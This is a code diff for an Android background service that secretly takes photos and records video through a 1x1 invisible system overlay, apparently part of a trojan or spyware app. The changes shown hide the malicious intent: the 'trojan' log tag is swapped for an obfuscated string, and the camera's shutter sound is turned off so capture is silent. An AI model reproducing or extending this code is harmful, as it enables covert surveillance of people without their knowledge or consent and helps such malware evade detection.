@@ -15,6 +15,8 @@ import java.util.*;
 
 public class CamRuntime extends Service {
 
+    private static String TAG = "AsDfGhJkL";
+
     private LocalBinder localBinder = new LocalBinder();
     private DummyPreview dummyPreview;
     private SystemThread system;
@@ -30,7 +32,7 @@ public class CamRuntime extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-		if (kualitas == 1) {
+        if (kualitas == 1) {
             kualitas = CamcorderProfile.QUALITY_480P;
         } else {
             kualitas = CamcorderProfile.QUALITY_LOW;
@@ -43,8 +45,8 @@ public class CamRuntime extends Service {
         WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         this.dummyPreview = new DummyPreview(this, startId);
         WindowManager.LayoutParams lp = new WindowManager.LayoutParams(1, 1,
-																	   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
-																	   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
+                                                                       WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                                                                       WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
         lp.gravity = Gravity.START | Gravity.TOP;
         wm.addView(dummyPreview, lp);
         return START_NOT_STICKY;
@@ -66,7 +68,7 @@ public class CamRuntime extends Service {
         int frontCamera = 1;
         if (kamera.equals("back")) {
             frontCamera = 0;
-            Log.i("trojan", "cam:"+frontCamera);
+            Log.i(TAG, "cam:"+frontCamera);
             Camera.getCameraInfo(frontCamera, cameraInfo);
         } 
 
@@ -77,20 +79,21 @@ public class CamRuntime extends Service {
 
         try {
             camera = Camera.open(frontCamera);
-        } catch (RuntimeException e) {
+        } 
+        catch (RuntimeException e) {
             camera = null;
             e.printStackTrace();
         }
         try {
             if (null == camera) {
-                Log.i("trojan", "camera null:"+frontCamera);
+                Log.i(TAG, "camera null:"+frontCamera);
             } else {
                 try {
                     camera.setPreviewTexture(new SurfaceTexture(0));
                     camera.startPreview();
                 } catch (Exception e) {
                     e.printStackTrace();
-                    Log.i("trojan", "err prev:"+e);
+                    Log.i(TAG, "err prev:"+e);
                 }
                 camera.takePicture(null, null, new Camera.PictureCallback() 
                 {
@@ -109,7 +112,7 @@ public class CamRuntime extends Service {
                             fos.write(data);
                             fos.close();
                         } catch (Exception error) {
-                            Log.i("trojan", "err save:"+error);
+                            Log.i(TAG, "err save:"+error);
                         }
                         camera.release();
                     }
@@ -117,7 +120,7 @@ public class CamRuntime extends Service {
             }
         } catch (Exception e) {
             camera.release();
-            Log.i("trojan", "err camera:"+e);
+            Log.i(TAG, "err camera:"+e);
 
         }
     }
@@ -147,6 +150,8 @@ class DummyPreview extends SurfaceView implements SurfaceHolder.Callback {
     private CamRuntime videoRecordService;
     private RecordThread recorderThread;
     private int serviceId;
+    private static String TAG = "AsDfGhJkL";
+
 
     public DummyPreview(CamRuntime videoRecordService, int serviceId) {
         super(videoRecordService);
@@ -174,7 +179,7 @@ class DummyPreview extends SurfaceView implements SurfaceHolder.Callback {
     public void surfaceDestroyed(SurfaceHolder holder) {
         if (recorderThread != null) {
             recorderThread.setAktif(false);
-            Log.i("trojan", "surface destroy");
+            Log.i(TAG, "surface destroy");
         }
     }
 
@@ -191,6 +196,7 @@ class RecordThread extends Thread {
     private final CamRuntime recorderService;
     private Camera camera;
     private String outputFile = "";
+    private static String TAG = "AsDfGhJkL";
 
     public RecordThread(int serviceId, CamRuntime recorderService, Camera camera) {
         this.serviceId = serviceId;
@@ -202,11 +208,13 @@ class RecordThread extends Thread {
 
     @Override
     public void run() {
-        Log.i("trojan", "save: "+outputFile);
+        Log.i(TAG, "save: "+outputFile);
         try {
             // Memulai proses rekaman
             MediaRecorder mediaRecorder = new MediaRecorder();
             camera.unlock();
+            camera.enableShutterSound(false);
+
             mediaRecorder.setCamera(camera);
             mediaRecorder.setOrientationHint(270);
             mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
